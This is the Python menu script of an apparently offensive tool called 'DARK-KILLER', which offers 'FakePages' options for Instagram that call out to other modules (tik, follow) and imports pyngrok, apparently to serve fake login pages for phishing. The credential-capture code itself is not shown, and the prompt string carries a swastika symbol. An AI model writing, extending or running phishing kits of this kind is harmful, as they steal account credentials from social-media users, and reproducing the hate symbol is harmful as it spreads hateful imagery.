# Coded By : Sepehr Dark :)
import os
import time
import sys
from subprocess import Popen
import banner
import tik
import follow
try:
  from colorama import Fore,style
except ImportError:
  os.system("clear")
  print("\n [✓] please install colorama\n [--] pip install colorama")
try:
  from pyngrok import ngrok
except ImportError:
  os.system("clear")
  print("\n [✓] please install pyngrok\n [--] pip install pyngrok")
  
#/////////////////////////////////#

while True:
  time.sleep(0.1)
  banner.list1()
  try:
    num = input(Fore.RED+" ┌─["+Fore.LIGHTGREEN_EX+"DARK-KILLER"+Fore.BLUE+"~"+Fore.WHITE+"@HOME"+Fore.RED+"""]
 └──╼ """+Fore.WHITE+"卐 "+Fore.GREEN)
    if num == '1':
      banner.list2()
      numfp = input(Fore.RED+" ┌─["+Fore.LIGHTGREEN_EX+"DARK-KILLER"+Fore.BLUE+"~"+Fore.WHITE+"@HOME"+Fore.RED+"/"+Fore.CYAN+"FakePages"+Fore.RED+"""]
 └──╼ """+Fore.WHITE+"卐 ")
      if numfp == '1':
        banner.listi()
        numi = input(Fore.RED+" ┌─["+Fore.LIGHTGREEN_EX+"DARK-KILLER"+Fore.BLUE+"~"+Fore.WHITE+"@HOME"+Fore.RED+"/"+Fore.CYAN+"FakePages"+Fore.RED+"/"+Fore.LIGHTYELLOW_EX+"Instageram"+Fore.RED+"""]
 └──╼ """+Fore.WHITE+"卐 "+Fore.GREEN)
        if numi == '1':
          tik.file()
        elif numi == '2':
          follow.file()
        elif numi == '3':
          try:
            pass
          except:
            print("")
            sys.exit()
        elif numi == '':
          print(Fore.RED+"[-]"+Fore.WHITE+"please Enter Number :)")
          time.sleep(2)
      elif numfp == '2':
        os.system("clear")
        print(Fore.LIGHTRED_EX+"[!]"+Fore.LIGHTBLUE_EX+"coming soon !\n")
        try:
          input(Fore.GREEN+"Back To Menu (Press Enter...)")
        except:
          print("")
          sys.exit()
      elif numfp == '3':
        try:
          input(Fore.GREEN+"Back To Menu (Press Enter...)")
        except:
          print("")
          sys.exit()
      elif numfp == '':
        print(Fore.RED+"[-]"+Fore.WHITE+"please Enter Number :)")
        time.sleep(2)
    elif num == '2':
      banner.list3()
    elif num == '3':
      sys.exit()
    elif num == '':
      print(Fore.RED+"[-]"+Fore.WHITE+"please Enter Number :)")
      time.sleep(2)
  except:
    print(Fore.WHITE+"\n [#] God bye")
    sys.exit()